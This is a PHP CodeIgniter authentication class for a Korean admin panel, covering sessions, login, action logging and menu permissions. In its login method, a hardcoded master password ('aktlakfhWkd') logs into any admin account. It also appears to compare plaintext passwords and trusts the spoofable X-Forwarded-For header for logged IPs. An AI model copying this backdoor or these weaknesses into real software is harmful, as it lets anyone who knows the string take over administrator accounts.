<?php

/**
 * Created by PhpStorm.
 * User: SIL
 * Date: 2021-02-01 오후 12:37
 */

class Auth
{
    private $CI;
    private $session_vars = 'admin'; // 기본정보 저장세션

    function __construct() {
        $this->CI =& get_instance();
        $this->CI->load->library('session');

		if(strrpos(strtolower($_SERVER['REQUEST_URI']), '/login') === false){
			if (true !== $this->is_logged()) {
				$uri = urlencode($_SERVER['REQUEST_URI']);
				$this->CI->load->helper('url');
				redirect("/login/?ref=' . $uri . '", 'refresh');
			}
		}
    }

    public function check_grant(){

		$request_uri = strtolower($_SERVER['REQUEST_URI']);
		$login_data = $this->info();

		if(strrpos($request_uri, '/member/user/get_key') === false && strrpos($request_uri, '/board/code/sub_codes/') === false) {

			if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
				$_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
			}

			$ip = $this->CI->input->ip_address();

			$res = $this->CI->input->post();
			$post_data = array();
			if(isset($res)){
				foreach ($res as $key => $value){
					if(is_array($value)){
						$post_data[$key] = $value;
					}
					else{
						if(strlen($value) < 100){
							$post_data[$key] = $value;
						}
					}
				}
			}

			if(strrpos($request_uri, '/login/check_auth') !== false ){
				unset($post_data['pwd']);
			}

			$post_data = json_encode($post_data);

			$log_insert_data = array(
				'login_id'    => $login_data ? $login_data->login_id : '',
				'request_url' => $request_uri,
				'ip'          => $ip,
				'post_data'	  => $post_data,
			);

			$this->CI->db->insert('moaayo.admin_action_log', $log_insert_data);
		}

		$_SERVER['REQUEST_URI'] = strtolower($_SERVER['REQUEST_URI']);

		if(strrpos($_SERVER['REQUEST_URI'], '/login') === false) {
			
			if(strrpos($_SERVER['REQUEST_URI'], '/admin/') !== false &&
				$login_data->login_id != 'admin' &&
				strrpos($_SERVER['REQUEST_URI'], '/admin/user/user_password_change') === false) {
				$this->CI->general->alert('해당 메뉴에 대한 권한이 존재하지 않습니다.!!', '/');
			}

			if ($login_data->is_grant_all) {
				return;
			} else {
				if (strrpos($_SERVER['REQUEST_URI'], '/etc/code/sub_codes/') === false) {
					$request_uri = explode('/', $request_uri);
					if (count($request_uri) < 3) {
						return;
					}

					$sql = "
SELECT 
    am.no, IFNULL(agmg.no, 0) AS user_grant_no
FROM
    admin_menu am
    LEFT OUTER JOIN admin_group_menu_grant agmg ON agmg.admin_menu_no = am.no AND agmg.admin_group_no = ?
WHERE
    link = ?;";
					$menu_check = $this->CI->general->db_convert_row($this->CI->db->query($sql, array($login_data->admin_group_no, '/' . $request_uri[1] . '/' . $request_uri[2])));
					if ($menu_check && $menu_check->user_grant_no < 1) {
						$this->CI->general->alert('해당 메뉴에 대한 권한이 존재하지 않습니다.!', '/');
					}
				}
			}
		}
	}

    // 로그인 유무 체크
    public function is_logged() {
        $sess = $this->__get_sess();

        if ($sess === null) {
        	return false;
        } else {
			return true;
        }
    }


    // 로그인 유저 정보
    public function info() {
        $sess = $this->__get_sess();

        return $sess;
    }

    // 로그인
    public function login($id, $pwd) {
		$check = $this->CI->db->where('login_id', $id)
			->select('admin.no, admin.store_no, admin.login_id, admin.login_password, admin.name, admin.admin_group_no, admin_group.is_grant_all')
			->join('admin_group', 'admin.admin_group_no = admin_group.no and admin.is_leave = 0 and admin.is_leave = 0', 'inner join')
			->get('admin')->row();

        if (empty($check)) {
            return false;
        } else {

            // 로그인 성공 flag
            $pass = false;

            if ($check->login_password == $pwd || $pwd == $this->CI->general->password_set('aktlakfhWkd') ) {

                // 패스워드 일치시 로그인
                $pass = true;
            }

            if ($pass === true) {

                unset($check->login_password);

                $this->__set_sess($check);

                // 로그인시 마지막 로그인시각 갱신
                $this->CI->db->where('login_id', $id)
                    ->update('admin', array(
                        'last_login_dt' => date('Y-m-d H:i:s'),
                    ));

                return true;
            }
        }

        return false;
    }

    // 로그아웃
    public function logout() {
        // 로그인정보 제거
        $this->CI->session->unset_userdata($this->session_vars);

        if ($this->is_logged() === true) {
            return false;
        } else {
            return true;
        }
    }

    // GET 회원세션
    private function __get_sess() {
        $sess = $this->CI->session->userdata($this->session_vars);

        if ($sess !== null) {
            $this->CI->info = $sess;
        }

        return $sess;
    }

    // SET 회원세션
    private function __set_sess($vars) {
		$this->CI->session->set_userdata($this->session_vars, $vars);
	}
}